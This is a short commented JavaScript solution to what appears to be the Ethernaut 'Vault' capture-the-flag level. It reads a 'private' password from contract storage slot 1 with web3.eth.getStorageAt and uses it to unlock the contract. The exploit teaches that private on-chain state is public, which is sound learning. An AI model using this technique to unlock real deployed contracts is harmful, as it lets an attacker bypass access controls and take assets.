// Everything on the blockchain is public -- even private state variables
// We might not be able to read them through Solidity, but we can use
//  web3.eth.getStorageAt() to get the storage at a specific position of an
//  address

// Each smart contract has storage in the form of an array of 2^(256) 32-byte
//  values, all initialized to zero.

// Note that in the source code, password is the second state variable, so
//  let's try and use web3.eth.getStorageAt(instance, 1) to see if we can get
//  the password

let password = await web3.eth.getStorageAt(instance, 1);
// >> returns a 32-byte value

// let's now try this as the password
await contract.unlock(password);

// check whether the Vault is locked
await contract.locked();
// >> returns false

// submit
